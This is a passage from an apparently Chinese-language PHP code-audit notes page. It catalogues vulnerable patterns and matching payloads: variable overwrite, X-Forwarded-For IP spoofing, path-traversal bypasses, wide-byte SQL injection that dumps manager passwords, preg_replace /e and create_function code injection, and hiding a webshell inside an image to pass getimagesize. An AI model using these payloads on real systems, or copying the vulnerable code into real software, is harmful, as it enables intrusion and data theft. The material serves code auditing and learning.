class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">foreach</span>($_COOKIE <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unset</span>($$_key);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t!ereg(<span class=\"string\">\"^\\_[A-Z]+\"</span>,$_key) &amp;&amp; $$_key=$_POST[$_key];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t!ereg(<span class=\"string\">\"^\\_[A-Z]+\"</span>,$_key) &amp;&amp; $$_key=$_GET[$_key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>通过表单来传值。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://localhost/qibo/member/comment.php?job=ifcom\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"cidDB\"</span>&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>这里的gid为查询参数<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_SERVER                 <span class=\"comment\">//中用户能够控制的变量，php5.0后不受GPC影响</span></span><br><span class=\"line\">QUERY_STRING             <span class=\"comment\">//用户GET方法提交时的查询字符串</span></span><br><span class=\"line\">HTTP_REFERER             <span class=\"comment\">//用户请求的来源变量，在一些程序取得用户访问记录时用得比较多</span></span><br><span class=\"line\">HTTP_USER_AGENT          <span class=\"comment\">//用户的浏览器类型，也用于用户的访问记录的取得</span></span><br><span class=\"line\">HTTP_HOST                <span class=\"comment\">//提交的主机头等内容</span></span><br><span class=\"line\">HTTP_X_FORWARDED_FOR     <span class=\"comment\">//用户的代理主机的信息</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"伪造IP\"><a href=\"#伪造IP\" class=\"headerlink\" title=\"伪造IP\"></a>伪造IP</h2><p>原理:<br>以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">关键字：</span><br><span class=\"line\">HTTP_</span><br><span class=\"line\">getenv</span><br><span class=\"line\">$_SERVER</span><br><span class=\"line\">服务端：</span><br><span class=\"line\"><span class=\"keyword\">echo</span> getenv(<span class=\"string\">'HTTP_CLIENT_IP'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]; <span class=\"comment\">//访问端（有可能是用户，有可能是代理的）IP</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'HTTP_CLIENT_IP'</span>]; <span class=\"comment\">//代理端的（有可能存在，可伪造）</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>]; <span class=\"comment\">//用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span></span><br><span class=\"line\">客户端：</span><br><span class=\"line\">注意发送的格式：</span><br><span class=\"line\">CLIENT-IP:<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span></span><br><span class=\"line\">X-FORWARDED-<span class=\"keyword\">FOR</span>:<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.10</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个玩意恒成立的。不管有没有clientip</span><br><span class=\"line\">【strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)】</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过正则匹配\"><a href=\"#绕过正则匹配\" class=\"headerlink\" title=\"绕过正则匹配\"></a>绕过正则匹配</h2><h3 id=\"缺少-和-限定\"><a href=\"#缺少-和-限定\" class=\"headerlink\" title=\"缺少^和$限定\"></a>缺少^和$限定</h3><h3 id=\"数组绕过正则\"><a href=\"#数组绕过正则\" class=\"headerlink\" title=\"数组绕过正则\"></a>数组绕过正则</h3><p>【\\A[ _a-zA-Z0-9]+\\z】</p>\n<h3 id=\"str-replace路径穿越\"><a href=\"#str-replace路径穿越\" class=\"headerlink\" title=\"str_replace路径穿越\"></a>str_replace路径穿越</h3><p>原理<br>str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。</span></span><br><span class=\"line\"><span class=\"comment\">## 方法1</span></span><br><span class=\"line\"><span class=\"comment\">## 五个点加///</span></span><br><span class=\"line\"><span class=\"comment\">## 方法2</span></span><br><span class=\"line\"><span class=\"comment\">## ...././/</span></span><br><span class=\"line\">$dir = str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">'..\\\\'</span>, <span class=\"string\">'../'</span>, <span class=\"string\">'./'</span>, <span class=\"string\">'.\\\\'</span>), <span class=\"string\">''</span>, trim($dir),$countb);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $dir;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;/br&gt;替换数量'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $countb;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 这里有对单独的.进行过滤，所以无法绕过。</span></span><br><span class=\"line\">$file = str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">'../'</span>, <span class=\"string\">'\\\\'</span>, <span class=\"string\">'..'</span>), <span class=\"keyword\">array</span>(<span class=\"string\">''</span>, <span class=\"string\">'/'</span>, <span class=\"string\">''</span>), $_GET[<span class=\"string\">'file'</span>],$counta);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $file;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;/br&gt;替换数量'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $counta;</span><br></pre></td></tr></table></figure>\n<h2 id=\"short-open-tag-on-短标签\"><a href=\"#short-open-tag-on-短标签\" class=\"headerlink\" title=\"short_open_tag=on 短标签\"></a>short_open_tag=on 短标签</h2><p>原理：<br>当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；<br>格式为：&lt;?xxxx;?&gt; –&gt; &lt;?xxx;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Go0s@ubuntu:~$ cat test.php</span><br><span class=\"line\">&lt;?=<span class=\"string\">\"helloworld\"</span>;</span><br><span class=\"line\">Go0s@ubuntu:~$ curl 127.0.0.1/test.php</span><br><span class=\"line\">helloworld</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"file-put-contents第二个参数传入数组\"><a href=\"#file-put-contents第二个参数传入数组\" class=\"headerlink\" title=\"file_put_contents第二个参数传入数组\"></a>file_put_contents第二个参数传入数组</h2><p>原理：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_put_contents(file,data,mode,context)</span><br><span class=\"line\">file\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span><br><span class=\"line\">data\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();</span></span><br><span class=\"line\"><span class=\"comment\">## 这个要从burp去传，因为后面的【?】会被理解为参数而截断</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = $_GET[<span class=\"string\">'data'</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">'filename'</span>];</span><br><span class=\"line\">$current = file_get_contents($file);</span><br><span class=\"line\">file_put_contents($file, $a);</span><br></pre></td></tr></table></figure>\n<h2 id=\"单引号和双引号\"><a href=\"#单引号和双引号\" class=\"headerlink\" title=\"单引号和双引号\"></a>单引号和双引号</h2><p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1</span></span><br><span class=\"line\">$s = <span class=\"string\">\"I am a 'single quote string' inside a double quote string\"</span>; </span><br><span class=\"line\">$s = <span class=\"string\">'I am a \"double quote string\" inside a single quote string'</span>; </span><br><span class=\"line\">$s = <span class=\"string\">\"I am a 'single quote string' inside a double quote string\"</span>; </span><br><span class=\"line\">$s = <span class=\"string\">'I am a \"double quote string\" inside a single quote string'</span>;</span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br><span class=\"line\">$abc=<span class=\"string\">'I love u'</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> $abc <span class=\"comment\">//结果是:I love u </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'$abc'</span> <span class=\"comment\">//结果是:$abc </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$abc\"</span> <span class=\"comment\">//结果是:I love u </span></span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br><span class=\"line\">$a=<span class=\"string\">\"$&#123;@phpinfo()&#125;\"</span>; <span class=\"comment\">//可以解析出来</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> $a=<span class=\"string\">\"$&#123;@phpinfo()&#125;\"</span>;<span class=\"meta\">?&gt;</span> <span class=\"comment\">//@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"查询语句缺少单引号\"><a href=\"#查询语句缺少单引号\" class=\"headerlink\" title=\"查询语句缺少单引号\"></a>查询语句缺少单引号</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"Select * from table where id=$id\"</span> <span class=\"comment\"># 有注入</span></span><br><span class=\"line\"><span class=\"string\">\"Select * from table where id=\"</span>.$id.<span class=\"string\">\" limit 1\"</span> <span class=\"comment\"># 有注入</span></span><br><span class=\"line\"><span class=\"string\">\"Select * from table where id='$id'\"</span> <span class=\"comment\"># 无注入</span></span><br><span class=\"line\"><span class=\"string\">\"Select * from table where id='\"</span>.$id.<span class=\"string\">\"' limit 1\"</span> <span class=\"comment\"># 无注入</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"宽字符注入\"><a href=\"#宽字符注入\" class=\"headerlink\" title=\"宽字符注入\"></a>宽字符注入</h2><p>原理<br>常见转码函数：<br>iconv()<br>mb_convert_encoding()<br>addslashes<br>防御：<br>用mysql_real_escape_string</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?username=tom&amp;password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+</span></span><br><span class=\"line\"><span class=\"comment\">## %df把\\给吃掉</span></span><br><span class=\"line\">$pwd = addslashes($pwd);</span><br><span class=\"line\">mysql_query(<span class=\"string\">\"SET NAMES gbk\"</span>);</span><br><span class=\"line\">$query = <span class=\"string\">\"select * from user where uname='\"</span>.$uname.<span class=\"string\">\"' and pwd='\"</span>.$pwd.<span class=\"string\">\"'\"</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"跳转无退出\"><a href=\"#跳转无退出\" class=\"headerlink\" title=\"跳转无退出\"></a>跳转无退出</h2><p>原理:<br>没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 1</span></span><br><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;myclass-&gt;notice(<span class=\"string\">'alert(\"系统已安装过\");window.location.href=\"'</span>.site_url().<span class=\"string\">'\";'</span>);</span><br><span class=\"line\"><span class=\"comment\">## 2</span></span><br><span class=\"line\">header(<span class=\"string\">\"location: ../index.php\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二次编码注入\"><a href=\"#二次编码注入\" class=\"headerlink\" title=\"二次编码注入\"></a>二次编码注入</h2><p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。<br>如%2527，两次urldecode会最后变成’<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64_decode -- 对使用 MIME base64 编码的数据进行解码</span><br><span class=\"line\">base64_encode -- 使用 MIME base64 对数据进行编码</span><br><span class=\"line\">rawurldecode -- 对已编码的 URL 字符串进行解码</span><br><span class=\"line\">rawurlencode -- 按照 RFC 1738 对 URL 进行编码</span><br><span class=\"line\">urldecode -- 解码已编码的 URL 字符串</span><br><span class=\"line\">urlencode -- 编码 URL 字符串</span><br><span class=\"line\">unserialize/serialize</span><br><span class=\"line\">字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"前端可控变量填充导致XSS\"><a href=\"#前端可控变量填充导致XSS\" class=\"headerlink\" title=\"前端可控变量填充导致XSS\"></a>前端可控变量填充导致XSS</h2><p>当html里的链接是变量时，易出现XSS。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=&#123;#、echo、print、printf、vprintf、<span class=\"tag\">&lt;<span class=\"name\">%=$test%</span>&gt;</span></span><br><span class=\"line\">img scr=&#123;#$list.link_logo#&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"命令执行函数\"><a href=\"#命令执行函数\" class=\"headerlink\" title=\"命令执行函数\"></a>命令执行函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">pcntl_exec()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\"><span class=\"keyword\">echo</span> `whoami`; <span class=\"comment\">//反引号调用shell_exec()函数</span></span><br><span class=\"line\">popen()和proc_open() <span class=\"comment\">//不会返回结果</span></span><br><span class=\"line\">array_map($arr,$array); <span class=\"comment\">//为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"</span></span><br><span class=\"line\">popen(<span class=\"string\">'whoami &gt;&gt;D: /2.txt'</span>, <span class=\"string\">'r'</span>); <span class=\"comment\">//这样就会在D下生成一个2.txt。</span></span><br><span class=\"line\">preg_replace()</span><br><span class=\"line\">ob_start()</span><br><span class=\"line\">array_map()</span><br></pre></td></tr></table></figure>\n<p>防范方法：<br>使用自定义函数或函数库来替代外部命令的功能<br>使用escapeshellarg 函数来处理命令参数<br>使用safe_mode_exec_dir 指定可执行文件的路径</p>\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function构造了一个return后面的语句为一个函数。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?sort_by=\"]);&#125;phpinfo();/*</span></span><br><span class=\"line\"><span class=\"comment\">#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);&#125;phpinfo();/*\"], $b[\"\"]);&#125;phpinfo();/*\"]);</span></span><br><span class=\"line\"><span class=\"comment\">#前面闭合，然后把后面的全部注释掉了。</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sort_by=$_GET[<span class=\"string\">'sort_by'</span>];</span><br><span class=\"line\">$sorter=<span class=\"string\">'strnatcasecmp'</span>;</span><br><span class=\"line\">$databases=<span class=\"keyword\">array</span>(<span class=\"string\">'test'</span>,<span class=\"string\">'test'</span>);</span><br><span class=\"line\">$sort_function = <span class=\"string\">' return 1 * '</span> . $sorter . <span class=\"string\">'($a[\"'</span> . $sort_by . <span class=\"string\">'\"], $b[\"'</span> . $sort_by . <span class=\"string\">'\"]);'</span>;</span><br><span class=\"line\">usort($databases, create_function(<span class=\"string\">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"mb-ereg-replace-的-e模式\"><a href=\"#mb-ereg-replace-的-e模式\" class=\"headerlink\" title=\"mb_ereg_replace()的/e模式\"></a>mb_ereg_replace()的/e模式</h3><p>原理<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:</span><br><span class=\"line\">string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= &quot;msr&quot;  ] )</span><br><span class=\"line\">当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"preg-replace-e模式执行命令\"><a href=\"#preg-replace-e模式执行命令\" class=\"headerlink\" title=\"preg_replace /e模式执行命令\"></a>preg_replace /e模式执行命令</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?str=[phpinfo()]</span></span><br><span class=\"line\"><span class=\"comment\"># 这里使用/e模式，所以第二个参数\\\\1这里可以执行。</span></span><br><span class=\"line\"><span class=\"comment\"># 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/\\[(.*)]/e\"</span>,<span class=\"string\">'\\\\1'</span>,$_GET[<span class=\"string\">'str'</span>]);</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态函数执行\"><a href=\"#动态函数执行\" class=\"headerlink\" title=\"动态函数执行\"></a>动态函数执行</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func</span><br><span class=\"line\">call_user_func_array</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?a=assert</span></span><br><span class=\"line\">call_user_func($_GET[<span class=\"string\">'a'</span>],$b);</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">create_function()</span><br></pre></td></tr></table></figure>\n<h3 id=\"eval-和assert-代码执行\"><a href=\"#eval-和assert-代码执行\" class=\"headerlink\" title=\"eval()和assert()代码执行\"></a>eval()和assert()代码执行</h3><p>当assert()的参数为字符串时 可执行PHP代码。<br>区别：assert可以不加;，eval不可以不加;。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">\" phpinfo(); \"</span>);【√】 <span class=\"keyword\">eval</span>(<span class=\"string\">\" phpinfo() \"</span>);【X】</span><br><span class=\"line\">assert(<span class=\"string\">\" phpinfo(); \"</span>);【√】 assert(<span class=\"string\">\" phpinfo() \"</span>);【√】</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"优先级绕过\"><a href=\"#优先级绕过\" class=\"headerlink\" title=\"优先级绕过\"></a>优先级绕过</h2><p>原理：<br>如果运算符优先级相同，那运算符的结合方向决定了该如何运算<br><a href=\"http://php.net/manual/zh/language.operators.precedence.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/language.operators.precedence.php</a></p>\n<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ($test = true) and false; $test2 = (true &amp;&amp; false);</span></span><br><span class=\"line\">$test = <span class=\"keyword\">true</span> <span class=\"keyword\">and</span> <span class=\"keyword\">false</span>; var_dump($test);<span class=\"comment\">//bool(true) </span></span><br><span class=\"line\">$test2 = <span class=\"keyword\">true</span> &amp;&amp; <span class=\"keyword\">false</span>; var_dump($test2); <span class=\"comment\">//bool(false)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</span></span><br><span class=\"line\">$test3 = is_numeric(<span class=\"string\">\"123\"</span>) <span class=\"keyword\">and</span> is_numeric(<span class=\"string\">\"anything false\"</span>); var_dump($test3); <span class=\"comment\">//bool(true)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"getimagesize图片判断绕过\"><a href=\"#getimagesize图片判断绕过\" class=\"headerlink\" title=\"getimagesize图片判断绕过\"></a>getimagesize图片判断绕过</h2><p>原理：<br>当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。<br>只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>\n<p>生成小马图的方法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat image.png webshell.php &gt; image.php</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 找上传点</span></span><br><span class=\"line\"><span class=\"comment\">## 文件头部加入GIF89a</span></span><br><span class=\"line\"><span class=\"comment\"># 1</span></span><br><span class=\"line\">$file = $request-&gt;getFiles();</span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(getimagesize($files[<span class=\"string\">'users'</span>][<span class=\"string\">'photo'</span>][<span class=\"string\">'tmp_name'</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          move_uploaded_file($files[<span class=\"string\">'users'</span>][<span class=\"string\">'photo'</span>][<span class=\"string\">'tmp_name'</span>], $filename);</span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br><span class=\"line\">$filesize = @getimagesize(<span class=\"string\">'/path/to/image.png'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($filesize) &#123;</span><br><span class=\"line\">    do_upload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"lt-变-，windows-findfirstfile利用\"><a href=\"#lt-变-，windows-findfirstfile利用\" class=\"headerlink\" title=\"&lt;变*，windows findfirstfile利用\"></a>&lt;变*，windows findfirstfile利用</h2><p>原理：<br>Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。<br>执行过程中，字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。<br>所以：</p>\n<ol>\n<li>“&gt;””&gt;&gt;”可代替一个字符,”&lt;”可以代替后缀多个字符，”&lt;&lt;”可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>\n<li>“ 可以代替.</li>\n<li>文件名第一个字符是”.”的话，读取时可以忽略之</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>NO</th>\n<th>Status</th>\n<th>Function</th>\n<th>Type of operation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1.</td>\n<td>OK</td>\n<td>include()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>2.</td>\n<td>OK</td>\n<td>include_once()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>3.</td>\n<td>OK</td>\n<td>require()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>4.</td>\n<td>OK</td>\n<td>require_once()</td>\n<td>Include 